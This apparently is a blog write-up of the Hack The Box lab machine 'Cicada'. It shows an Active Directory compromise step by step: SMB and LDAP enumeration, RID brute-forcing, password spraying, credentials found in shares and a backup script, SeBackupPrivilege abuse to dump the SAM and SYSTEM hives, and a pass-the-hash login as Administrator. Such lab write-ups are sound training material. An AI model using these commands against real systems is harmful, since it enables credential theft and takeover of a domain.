---
title: HTB - Cicada
author: mashhood
date: 2024-09-30 12:12:00 +0530
description: The Cicada is an Easy HTB season 6 machine involves exploiting a Windows Active Directory setup.
categories: [Writeup]
tags: [htb]
---

# HTB - Cicada

The Cicada is an Easy HTB season 6 machine involves exploiting a Windows Active Directory setup. By enumerating SMB shares, we gradually gain access to sensitive information. After finding passwords in shared files and an LDAP domain dump, we escalate privileges to gain full control of the system.

## Enumeration

After performing an initial Nmap scan, several interesting services were identified:

```
─(kali㉿kali)-[~/Desktop]  
└─$nmap 10.10.11.35 -sC -sV --min-rate 1000 -oN nmap-cicada.txt 
# Nmap 7.94SVN scan initiated Mon Sep 30 01:31:37 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV --min-rate 1000 -oN nmap-cicada.txt 10.10.11.35
Nmap scan report for 10.10.11.35
Host is up (0.20s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-30 12:32:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, 
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)

Host script results:
| smb2-time: 
|   date: 2024-09-30T12:32:49
|_  start_date: N/A
|_clock-skew: 7h00m15s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

There is no web based technology available here. So, with SMB (`445/tcp`) and LDAP (`389/tcp`, `636/tcp`) available, it’s worth investigating these services further. Since nmap shows that the Domain name of the target system is cicada.htb, we will add it to our `/etc/hosts` file
```
─(kali㉿kali)-[~/Desktop]  
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.35     cicada.htb
```

## SMB Enumeration

Using `smbclient`, we attempt to list shares:

```bash
─(kali㉿kali)-[~/Desktop]  
└─$ smbclient -L 10.10.11.35
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
DEV             Disk
HR              Disk
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

The interesting shares here are `DEV` and `HR`. The `HR` share have a file named `Notice from HR.txt` . 
```
─(kali㉿kali)-[~/Desktop]  
└─$ smbclient \\\\10.10.11.35\\HR -N
smb: \> ls
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024
```
The password `Cicada$M6Corpb*@Lp#nZp!8` for the new employee's account was found within this document.
So, we attempt to gather usernames via `crackmapexec` by brute-forcing the RID which reveals several users:

```bash
─(kali㉿kali)-[~/Desktop]  
└─$ crackmapexec smb 10.10.11.35 -u anonymous -p "" --rid-brute

1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1601: CICADA\emily.oscars (SidTypeUser)
```

We create a wordlist with the found usernames and attempt to brute force credentials using `crackmapexec` which reveals that the credential we discovered before is for the user **Michael Wrightson**:

```bash
─(kali㉿kali)-[~/Desktop]  
└─$ crackmapexec smb 10.10.11.35 -u users-cicada.txt -p pass.txt

SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

```
michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

## LDAP Enumeration

Using Michael Wrightson’s credentials, we perform an LDAP domain dump:

```bash
─(kali㉿kali)-[~/Desktop]  
└─$ ldapdomaindump ldap://10.10.11.35 -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

From the domain dump, we discover **David Orelious’s password** in the description section of domain users:

![Desktop View](/assets/img/posts/30092024/cicada-ldap.png)

```
david.orelious:aRt$Lp#7t*VQ!3
```

## SMB Access - DEV Share

With David Orelious’s credentials, we access the **DEV** SMB share:

```bash
smbclient //10.10.11.35/DEV -U david.orelious
```

In the **DEV** share, we find a **Backup_script.ps1** file, which contains another set of credentials for **Emily Oscars**:

```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

```
emily.oscars:Q!3@Lp#M6b*7t*Vt
```

## Privilege Escalation

#### Evil-WinRM Access
Using Emily Oscar’s credentials, we establish a connection via `evil-winrm`:

```bash
evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

Once connected, we check the privileges with `whoami /priv`. Here, we notice that Emily has high-privilege tokens enabled:

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

####  Dumping SAM and SYSTEM

With **SeBackupPrivilege** enabled, we can use it to dump the **SAM** and **SYSTEM** registry hives to extract hashes for privilege escalation.
Copy the `sam` file and `system` to a folder with these command and download it to the attacker machine.
``` powershell
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```
Then use `pypykatz` to extract the hash from these files.
```bash
pypykatz registry --sam sam system
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

With this hash we can login as Administrator using `evil-winrm`.
```
evil-winrm -i 10.10.11.35 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
```

# Reference
https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
